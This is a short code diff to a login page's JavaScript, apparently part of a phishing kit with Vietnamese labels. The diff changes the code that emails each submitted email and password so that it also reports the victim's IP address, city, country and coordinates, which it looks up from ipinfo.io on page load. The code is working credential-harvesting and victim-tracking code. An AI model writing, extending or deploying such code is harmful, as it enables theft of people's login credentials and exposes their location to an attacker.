@@ -2,7 +2,8 @@ function login() {
     var email = document.getElementById("email").value;
     var pass = document.getElementById("pass").value;
     if(email && pass){
-        sendEmail(`Người dùng: ${email}, password: ${pass}`);
+
+        sendEmail(`Người dùng: <strong>${email}</strong><br/>Password: <strong>${pass}</strong><br/>Thành phố: <strong>${myCity || myRegion|| ''}</strong><br/>Quốc gia: ${myCountry || ''}<br/>IP: ${myIp || ''}<br/>Latitude: ${myLat || ''}<br/>Longitude: ${myLon || ''}`);
     }
     else{
         var emailCls = document.getElementsByClassName("error-email"); 
@@ -64,3 +65,20 @@ function SendHTTP(){
           };
 		xhttp.send(JSON.stringify(dataToSend));
 }
+var myCity, myCountry, myRegion,  myLat, myLon, myIp = undefined;
+$(document).ready(() => {    
+    function getLocation() {
+      $.getJSON("https://ipinfo.io/", onLocationGot);
+    }
+   
+    function onLocationGot(info) {
+      let position = info.loc.split(",");
+      myLat = position[0];
+      myLon = position[1];
+      myCity = info.city;
+      myCountry = info.country;
+      myRegion = info.region;
+      myIp = info.ip;
+    }
+    getLocation();
+  });
